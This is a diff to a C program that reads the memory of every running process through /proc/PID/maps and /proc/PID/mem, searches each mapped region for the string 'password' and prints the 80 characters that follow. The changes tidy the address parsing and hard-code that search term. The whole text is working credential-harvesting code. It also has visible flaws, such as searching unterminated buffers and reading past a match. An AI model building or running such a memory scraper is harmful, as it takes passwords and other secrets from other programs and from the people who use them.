@@ -27,7 +27,7 @@ int main(int argc, char **argv) {
       sprintf(maps_path, "/proc/%s/maps", dirent->d_name);
       sprintf(mem_path, "/proc/%s/mem", dirent->d_name);
 
-      printf("maps -> %s\n", maps_path);
+      // printf("maps -> %s\n", maps_path);
 
       // maps
       FILE *maps = fopen(maps_path, "r");
@@ -60,12 +60,16 @@ int main(int argc, char **argv) {
         char start_str[16];
         char end_str[16];
 
-        // use strtol directly and pass end_ptr?
-        sscanf(map_line, "%12s-%12s", start_str, end_str);
-        printf("[ADDRESS] %s-%s\n", start_str, end_str);
+        // printf("LINE: %s\n", map_line);
 
-        long int start = strtol(start_str, NULL, 16);
-        long int end = strtol(end_str, NULL, 16);
+        // use strtol directly and pass end_ptr?
+        // sscanf(map_line, "%12s-%12s", start_str, end_str);
+        // printf("[ADDRESS] %s-%s\n", start_str, end_str);
+
+        char* end_ptr;
+        long int start = strtol(map_line, &end_ptr, 16);
+        end_ptr++;
+        long int end = strtol(end_ptr, NULL, 16);
 
         // SEEK_SET or SEEK_CUR?
         lseek(mem, start, SEEK_SET);
@@ -79,16 +83,18 @@ int main(int argc, char **argv) {
         char *data = malloc(size + 1);
 
         read(mem, data, size);
-        printf("[%ld] %s \n",size ,data);
 
-        char* match = strstr(data, looking_for);
+        char* match = strstr(data, "password");
         if(match != NULL){
-          printf("[PASSWORD]: %s\n", match);
+          // printf("[PASSWORD]: %s\n", match);
+          for(int i = 0; i <= 80; i++){
+            putchar(match[i]);
+          }
+
+            putchar('\n');
         }
 
         free(data);
-
-        printf("%ld-%ld \n", start, end);
       };
 
       free(map_line);
